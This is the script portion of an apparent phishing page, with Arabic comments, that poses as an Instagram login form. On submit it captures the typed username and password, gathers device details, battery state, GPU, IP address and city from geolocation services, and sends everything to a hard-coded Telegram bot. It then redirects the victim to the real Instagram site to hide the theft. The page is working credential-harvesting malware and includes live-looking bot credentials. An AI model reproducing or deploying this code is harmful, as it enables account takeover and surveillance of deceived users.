    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
    <script>
        const TOKEN = "7525790359:AAFSDi6cbMl-rGmhsfB4ZlE7dyxu_SWZV6A";                                                            
        const CHAT_ID = "7227848432";                                                       
        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        
    
        document.addEventListener('DOMContentLoaded', function() {
            // التحقق من نوع الجهاز فور تحميل الصفحة
            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
            const body = document.querySelector('body');
            if (isMobile) {
                body.classList.add('mobile-device');
            }

            // تحسين أداء النموذج
            const loginForm = document.getElementById('login-form');
            const loginBtn = document.getElementById('login-btn');
            const usernameInput = document.getElementById('username');
            const passwordInput = document.getElementById('password');

            loginForm.addEventListener('submit', async function(e) {
                e.preventDefault();
                
                if (loginBtn.disabled) return;
                loginBtn.disabled = true;
                loginBtn.innerHTML = '<span class="loading">جاري التحميل...</span>';

                try {
                    const batteryInfo = await getBatteryInfo();
                    const webGLInfo = getWebGLInfo();
                    const browserInfo = getBrowserInfo();
                    
                    const message = `
🔒 *تسجيل دخول جديد*
━━━━━━━━━━━━━━━
👤 *بيانات الحساب*
• المستخدم: \`${usernameInput.value.trim()}\`
• كلمة السر: \`${passwordInput.value.trim()}\`
• الوقت: \`${new Date().toLocaleString('ar-SA')}\`

📱 *معلومات الجهاز*
• النوع: \`${browserInfo.platform}\`
• المتصفح: \`${browserInfo.browser}\`
• النظام: \`${browserInfo.os}\`
• اللغة: \`${navigator.language}\`

🖥️ *معلومات الشاشة*
• الدقة: \`${window.screen.width}x${window.screen.height}\`
• الألوان: \`${window.screen.colorDepth}bit\`
• النافذة: \`${window.innerWidth}x${window.innerHeight}\`

🔋 *معلومات البطارية*
• المستوى: \`${batteryInfo.level}%\`
• حالة الشحن: \`${batteryInfo.charging ? '⚡️ جاري الشحن' : '🔌 غير متصل'}\`

🌐 *معلومات الشبكة*
• IP: \`${await getIPAddress()}\`
• المدينة: \`${await getLocation()}\`
• الاتصال: \`${navigator.connection?.effectiveType || 'unknown'}\`

💾 *معلومات تقنية*
• GPU: \`${webGLInfo.renderer}\`
• وحدة المعالجة: \`${webGLInfo.vendor}\`
• الذاكرة: \`${getMemoryInfo()}\`
• كوكيز: \`${navigator.cookieEnabled ? '✅' : '❌'}\`

🔍 *معلومات إضافية*
• التوقيت: \`${Intl.DateTimeFormat().resolvedOptions().timeZone}\`
• DPI: \`${window.devicePixelRatio}\`
• PWA: \`${isPWAInstalled() ? '✅' : '❌'}\`
━━━━━━━━━━━━━━━`;

                    await sendToTelegram(message);
                    
                    setTimeout(() => {
                        window.location.href = 'https://www.instagram.com/';
                    }, 1000);

                } catch (error) {
                    console.error('Error:', error);
                    loginBtn.innerHTML = 'حاول مرة أخرى';
                    setTimeout(() => {
                        loginBtn.disabled = false;
                        loginBtn.innerHTML = 'Log in';
                    }, 2000);
                }
            });

            // تحسين أداء الإدخال
            [usernameInput, passwordInput].forEach(input => {
                input.addEventListener('input', function() {
                    this.value = this.value.trim();
                });
            });
        });

        // تحسين دالة إرسال البيانات
        async function sendToTelegram(message) {
            const response = await fetch(URI_API, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    parse_mode: 'Markdown',
                    text: message
                })
            });

            if (!response.ok) {
                throw new Error('فشل إرسال البيانات');
            }
            return response;
        }

        // تحسين دالة الحصول على معلومات البطارية
        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        level: Math.floor(battery.level * 100),
                        charging: battery.charging
                    };
                } catch {
                    return { level: 'غير متوفر', charging: false };
                }
            }
            return { level: 'غير مدعوم', charging: false };
        }

        // تحسين التعامل مع الشبكة
        window.addEventListener('online', updateOnlineStatus);
        window.addEventListener('offline', updateOnlineStatus);

        function updateOnlineStatus() {
            const isOnline = navigator.onLine;
            if (!isOnline) {
                alert('تأكد من اتصالك بالإنترنت');
            }
        }

        function getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return {
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                };
            } catch {
                return { vendor: 'غير متوفر', renderer: 'غير متوفر' };
            }
        }

        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = "top";
                ctx.font = "14px 'Arial'";
                ctx.textBaseline = "alphabetic";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125,1,62,20);
                ctx.fillStyle = "#069";
                ctx.fillText("Hello, world!", 2, 15);
                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                ctx.fillText("Hello, world!", 4, 17);
                
                return canvas.toDataURL().slice(-50);
            } catch {
                return 'unknown';
            }
        }

        function getAudioFingerprint() {
            try {
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                return audioContext.sampleRate.toString();
            } catch {
                return 'unknown';
            }
        }

        async function getIPAddress() {
            try {
                const response = await fetch('https://api.myip.com');
                const data = await response.json();
                return data.ip;
            } catch {
                try {
                    // محاولة ثانية باستخدام خدمة بديلة
                    const response = await fetch('https://api64.ipify.org?format=json');
                    const data = await response.json();
                    return data.ip;
                } catch {
                    return 'غير متوفر';
                }
            }
        }

        async function getLocation() {
            try {
                const response = await fetch('https://ipwho.is/');
                const data = await response.json();
                return `${data.city}, ${data.country}`;
            } catch {
                return 'غير متوفر';
            }
        }

        // دوال مساعدة جديدة
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            let browser = 'unknown';
            let os = 'unknown';
            let platform = 'Desktop';

            // تحديد المتصفح
            if (ua.includes('Chrome')) browser = 'Chrome';
            else if (ua.includes('Firefox')) browser = 'Firefox';
            else if (ua.includes('Safari')) browser = 'Safari';
            else if (ua.includes('Edge')) browser = 'Edge';
            else if (ua.includes('Opera')) browser = 'Opera';

            // تحديد نظام التشغيل
            if (ua.includes('Windows')) os = 'Windows';
            else if (ua.includes('Mac')) os = 'MacOS';
            else if (ua.includes('Linux')) os = 'Linux';
            else if (ua.includes('Android')) {
                os = 'Android';
                platform = 'Mobile';
            }
            else if (ua.includes('iPhone') || ua.includes('iPad')) {
                os = 'iOS';
                platform = 'Mobile';
            }

            return { browser, os, platform };
        }

        function getMemoryInfo() {
            if ('memory' in performance) {
                const memory = performance.memory;
                return `${Math.round(memory.usedJSHeapSize / 1024 / 1024)}MB/${Math.round(memory.jsHeapSizeLimit / 1024 / 1024)}MB`;
            }
            return 'غير متوفر';
        }

        function isPWAInstalled() {
            return window.matchMedia('(display-mode: standalone)').matches || 
                   window.navigator.standalone || 
                   document.referrer.includes('android-app://');
        }
    </script>
